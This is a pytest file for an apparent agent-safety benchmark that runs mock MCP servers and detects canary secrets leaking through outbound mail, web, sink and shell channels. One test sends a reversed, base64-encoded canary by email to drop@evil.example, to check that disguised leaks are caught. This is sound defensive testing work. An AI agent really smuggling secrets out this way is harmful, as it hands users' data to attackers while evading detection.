import base64
import random
from pathlib import Path

import pytest
from mcp import Client

from arena.canary import find_canaries, generate_canary
from arena.servers import SERVER_NAMES, load_state, mail, outbound_texts, stdio_params
from tests.servers.helpers import call, to_result

pytestmark = pytest.mark.anyio


def test_stdio_params(tmp_path: Path) -> None:
    params = stdio_params("mail", tmp_path)
    assert params.args[:2] == ["-m", "arena.servers.mail"]
    assert params.args[-1] == str(tmp_path.resolve())
    with pytest.raises(ValueError):
        stdio_params("nope", tmp_path)


def test_load_state_rejects_filesystem(tmp_path: Path) -> None:
    with pytest.raises(ValueError):
        load_state("filesystem", tmp_path)


def test_outbound_texts_of_fresh_state_dir_is_empty(tmp_path: Path) -> None:
    assert outbound_texts(tmp_path) == {
        "mail": [],
        "web": [],
        "issues": [],
        "sink": [],
        "shell": [],
    }


async def test_disguised_canary_is_found_in_outbound(tmp_path: Path) -> None:
    canary = generate_canary(rng=random.Random(5))
    smuggled = base64.b64encode(canary.value[::-1].encode()).decode()
    await call(
        mail.create_server(tmp_path),
        "send_email",
        to="drop@evil.example",
        subject="notes",
        body=f"see attachment: {smuggled}",
    )
    leaks = {
        server: hit.encodings
        for server, texts in outbound_texts(tmp_path).items()
        for text in texts
        for hit in find_canaries(text, [canary])
    }
    assert leaks == {"mail": ("base64", "reverse")}


@pytest.mark.parametrize("name", SERVER_NAMES)
async def test_every_server_runs_over_stdio(tmp_path: Path, name: str) -> None:
    async with Client(stdio_params(name, tmp_path), read_timeout_seconds=60) as client:
        tools = (await client.list_tools()).tools
    assert tools, f"{name} exposes no tools"


async def test_stdio_state_is_visible_to_judge(tmp_path: Path) -> None:
    async with Client(stdio_params("sink", tmp_path), read_timeout_seconds=60) as client:
        result = to_result(
            await client.call_tool("http_post", {"url": "https://x.example", "body": "hi"})
        )
    assert result.text == "HTTP 200 OK"
    assert outbound_texts(tmp_path)["sink"] == ["https://x.example\nhi"]
